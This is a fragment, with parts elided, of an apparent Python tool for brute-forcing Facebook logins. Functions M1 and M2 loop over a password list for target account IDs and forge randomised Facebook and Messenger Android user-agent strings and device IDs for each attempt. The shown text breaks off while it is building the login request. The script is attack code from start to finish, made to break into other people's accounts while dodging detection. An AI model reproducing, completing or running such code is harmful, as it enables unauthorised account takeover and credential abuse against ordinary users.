...
\033[1;32m[\033[1;37m*\033[1;32m] \033[1;32mVERSION : \033[1;37m0.1 
\033[1;36m═════════════════════════════════════════
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+';[FBAN/Orca-Android;FBAV/14.0.0.1107;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/906926041;FBCR/SCO;FBMF/samsung;FBBD/samsung;FBDV/SM-J510FN|NMF26X;FBSV/10.2.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1273,height=2368};FB_FW/1;FBRV/906926041]'
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+';[Davik/2.1.0 (linux; U; Android 6.0.1; Infinix Smart 8 Build/SP1A.210812.016[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix Smart 8;FBSV/11;FBDM/{density=3.0,width=1280,height=720};]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
